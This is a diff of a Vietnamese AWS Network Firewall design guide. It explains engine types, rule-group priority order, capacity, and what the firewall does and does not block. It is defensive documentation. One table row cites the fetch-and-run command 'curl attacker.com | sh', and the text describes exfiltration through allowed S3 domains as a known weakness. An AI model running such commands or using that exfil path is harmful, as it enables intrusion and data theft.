@@ -673,7 +673,55 @@ Cân nhắc kỹ trước khi bật SCP này: đưa Lambda vào VPC làm cold st
 
 ## 7. Firewall policy và rule group
 
+### 7.0. Ba engine, và cách policy được đánh giá
+
+Network Firewall là **Suricata chạy như dịch vụ AWS**. Bên trong có ba engine, mỗi cái nhìn thấy một thứ khác nhau:
+
+| Engine | Nhìn thấy | Dùng để |
+|---|---|---|
+| **Stateless** | 5-tuple: IP nguồn/đích, port, protocol | Loại rác trước khi tốn CPU của stateful. Như NACL nhưng nhanh hơn |
+| **Stateful** | Cả **phiên** — gói này thuộc kết nối nào, chiều nào, đã bắt tay chưa | Toàn bộ rule east-west |
+| **Domain list** | TLS **SNI** và HTTP **Host** | Allowlist domain ra Internet |
+
+Stateful là thứ đáng tiền. Nó theo dõi trạng thái TCP, nên `pass` **một chiều** là gói trả về tự động được cho qua — đó là lý do rule chỉ khai chiều gọi. Khai thêm chiều ngược là mở một đường thật sự mới, hiếm khi là ý của người khai.
+
+#### Thứ tự đánh giá
+
+Ở `STRICT_ORDER`, duyệt từ **ưu tiên nhỏ đến lớn**, trong mỗi group duyệt theo `sid`. **Hành động kết thúc** (`pass` / `drop` / `reject`) dừng đánh giá ngay tại đó. `alert` **không** kết thúc — nó ghi log rồi đi tiếp.
+
+```
+gói tin → [100] → [150] → [200] → stateful_default_actions
+           ↑ pass ở đây thì không bao giờ tới 150 hay 200
+```
+
+Đó là lý do rule catch-all cuối cùng dùng `alert` chứ không phải `pass`: nó ghi lại **mọi luồng nội bộ không khớp rule nào ở trên** mà không tự cho qua. Log của riêng `sid` đó là bản đồ thật về ai đang gọi ai — chính là thứ để dựng danh sách rule trước khi chuyển `drop`.
+
+#### Ví dụ đang chạy thật
+
+`demo/network-lz-full` sau khi nối [lớp vận hành](./25-Van-hanh-Network-Hang-Ngay.md):
+
+| Ưu tiên | Rule group | Capacity | Nội dung |
+|---|---|---|---|
+| **100** | `<project>-east-west` | 100 | Luồng **hạ tầng** (NLB→app sid 1800, SSM→endpoint sid 1810), mesh đo đường, catch-all `alert` sid 1999 |
+| **150** | `<project>-ops-east-west` | 1000 | Sinh từ catalog YAML của lớp `ops/` |
+| **200** | `<project>-egress-domains` | 200 | Allowlist domain, khớp TLS SNI / HTTP Host |
+
+**Thứ tự này là load-bearing, không phải sắp cho gọn.**
+
+*150 phải sau 100.* Rule group 100 chứa hai luồng hạ tầng. Nếu lớp ops được đọc trước, một rule trong catalog có thể trùm lên `sid 1810` và làm **mất SSM ở mọi spoke** — mà SSM là đường duy nhất vào instance để sửa. `verify.sh` mục 9 kiểm đúng điều kiện này.
+
+*200 phải sau cùng — và đây là chỗ tinh tế nhất.* Rule group domain có `HOME_NET = 10.0.0.0/8`, tức nó đánh giá **cả luồng east-west nội bộ**, không chỉ luồng ra Internet. Một `curl` từ spoke này sang IP của spoke kia không có SNI/Host nào khớp allowlist. Nó không bị chặn **chỉ vì** group 100 và 150 đã `pass` trước đó. Đảo 200 lên đầu là east-west chết sạch, và triệu chứng đọc như "firewall chặn nhầm" chứ không chỉ vào thứ tự.
+
+#### Capacity — đặt rộng ngay từ đầu
+
+Capacity là số "chỗ" xử lý mà rule group **giữ trước**, tính theo số tổ hợp `nguồn × đích × port`. Không phải số rule đang có.
+
+**Capacity là bất biến.** Sửa nó là Terraform xoá và tạo lại rule group → ARN mới → policy tham chiếu một ARN đã biến mất, và apply hỏng giữa chừng. Capacity không dùng tốn **$0** — Network Firewall tính tiền theo giờ endpoint và GB xử lý. Nên để rộng ngay là lựa chọn đúng, không phải lãng phí.
+
+Giới hạn: **30.000** capacity cho toàn bộ phần stateful của một policy.
+
 ```hcl
+
 resource "aws_networkfirewall_firewall_policy" "main" {
   provider = aws.network
   name     = "${var.project}-policy"
@@ -886,6 +934,50 @@ resource "aws_networkfirewall_logging_configuration" "main" {
 ```
 
 ALERT ghi những gì bị chặn hoặc khớp rule `alert`. FLOW ghi **mọi** luồng — rất giá trị nhưng tốn dung lượng. Đặt lifecycle S3 chuyển Glacier sau 30 ngày.
+
+---
+
+### 7.5. Chặn được gì, và không chặn được gì
+
+Nửa sau của bảng này quan trọng hơn nửa đầu.
+
+#### Chặn được
+
+| Mối nguy | Bằng cách nào |
+|---|---|
+| **Lateral movement giữa các VPC** | `drop` + danh sách rule tường minh. Spoke bị chiếm không với sang spoke khác nếu không có rule |
+| **Port scan nội bộ** | Chặn, và catch-all `alert` ghi lại toàn bộ |
+| **Exfil ra domain lạ** | Allowlist SNI/Host — `curl attacker.com \| sh` chết ngay |
+| **Đội workload tự nới security group** | SG mở port 22 mà firewall vẫn chặn. Hai chủ sở hữu, không bên nào một mình mở được đường |
+| **Malware C2 tới domain/IP đã biết** | Cần **managed rule group** (xem §7 phần đầu) — code mẫu có, demo chưa bật cái nào |
+
+Dòng thứ tư mới là điểm kiến trúc. SG do **đội workload** sửa, firewall do **đội network** sửa, và route `0.0.0.0/0 → security VPC` nằm trong TGW của account network nên không account nào tự bỏ qua được.
+
+#### Không chặn được
+
+| Mối nguy | Thứ đúng để dùng |
+|---|---|
+| **SQLi, XSS, path traversal** | AWS WAF ở CloudFront/ALB — [doc 14](./14-Ingress-Chain-CDN-PaloAlto-F5-WAF.md) |
+| **Payload xấu bên trong TLS** | Bật **TLS inspection** (cần ACM cert + CA nội bộ), hoặc appliance L7 |
+| **Exfil qua domain ĐƯỢC PHÉP** | VPC endpoint policy + điều kiện `aws:PrincipalOrgID` |
+| **Lạm dụng credential qua AWS API** | IAM/SCP + CloudTrail + GuardDuty — [doc 23](./23-Lop-Phat-Hien-GuardDuty-SecurityHub-Log-Archive.md) |
+| **Traffic trong CÙNG một VPC** | Security group. Luồng đó không qua TGW nên không bao giờ tới firewall |
+| **DDoS L3/L4** | AWS Shield |
+| **DNS tunneling** | **Route 53 Resolver DNS Firewall** |
+
+**Dòng "exfil qua domain được phép" là lỗ hổng thật của thiết kế này**, và nó không hiển nhiên. Allowlist domain nghe như đã khoá chặt, nhưng `.amazonaws.com` nằm trong danh sách mở toang cho **mọi bucket S3 trên thế giới** — kể cả bucket của kẻ tấn công. Firewall thấy SNI hợp lệ và cho qua. Chặn nó là việc của endpoint policy, không phải của firewall.
+
+#### Hai lớp nên thêm
+
+**1. Managed rule group.** AWS có sẵn bộ chữ ký cập nhật liên tục — botnet C2, malware domain, IP có tiếng xấu. Thêm ở ưu tiên sau allowlist domain (§7 phần đầu có mẫu). Cột `Managed` trong console hiện là `No` cho cả ba group: chưa có bộ tình báo mối đe doạ nào đang chạy.
+
+**2. Route 53 Resolver DNS Firewall.** Chặn ở tầng **truy vấn DNS**, trước cả khi có gói tin. Với [DNS tập trung qua Route 53 Profile](./12-DNS-va-VPC-Endpoint-Tap-Trung-AWS-Only.md) thì nó gắn vào rất tự nhiên, và bắt được thứ Network Firewall không thấy: DNS tunneling, và tên miền độc hại mà máy chưa kịp kết nối tới.
+
+Hai lớp bổ sung nhau: DNS Firewall nói *"đừng hỏi địa chỉ đó"*, Network Firewall nói *"đừng gửi gói tin tới đó"*.
+
+#### Điều kiện để mọi dòng ✅ ở trên có nghĩa
+
+Ở `firewall_mode = "alert"` thì **không dòng nào đúng cả** — firewall chỉ ghi log, mặc định vẫn cho qua. Mọi thứ trong bảng đầu chỉ thành sự thật sau khi chuyển `drop`, và trước khi chuyển thì phải tắt rule mesh (nếu có) rồi đọc log catch-all đủ lâu. Xem [mục 12](#12-lộ-trình--tuyệt-đối-không-bật-chặn-ngay).
 
 ---
 
